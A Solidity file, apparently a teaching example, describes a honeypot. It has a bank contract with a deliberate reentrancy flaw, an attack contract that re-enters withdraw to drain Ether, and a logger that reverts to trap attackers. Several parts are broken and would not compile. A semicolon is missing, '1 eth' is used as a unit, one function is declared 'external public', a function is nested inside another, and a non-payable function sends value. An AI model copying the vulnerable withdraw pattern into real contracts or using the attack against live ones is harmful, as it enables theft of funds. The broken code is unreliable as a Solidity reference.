pragma solidity 0.8.10;

/*The idea here is here is to make a fake bank that is vulnerable to reentrancy attack,
but that uses another smart contract to log a withdrawal, and this second smart contract reverts everytime.
So when an attacker loops several times throught the reentrancy, he burns gas is the process, and on the last call,
the withdraw function finally goes throught to the end and calls the log function from the logging contract, that reverts, and gets 
all the stolen funds back.
The attacker has no stolen funds to show for but paid a lot on gas fees.
*/

contract Bank{

    Logger logger;

    mapping (address => uint) public balances;

    constructor(Logger loggerAddress) {
        logger = Logger(loggerAddress)
    }

    function withdraw(uint amount) external {
        require(balances[msg.sender] >= amount, "Not enought funds");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= amount;

        logger.log(msg.sender, amount, 'withdraw');
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

contract Attack {

    Bank bank;
    
    constructor(Bank bankAddress) {
        bank = Bank(bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance > 1 eth) {
            bank.withdraw(1 eth);
        }
    }

    function attack() external {
        bank.deposit{value: 1 eth}();
        bank.withdraw(1 eth);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract HoneyPot {

    function log(address _caller, uint amount, string memory action) external public {
        if(equal(action, 'withdraw')) {
            revert('No this time, sucker!');
        }

            // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
    }
}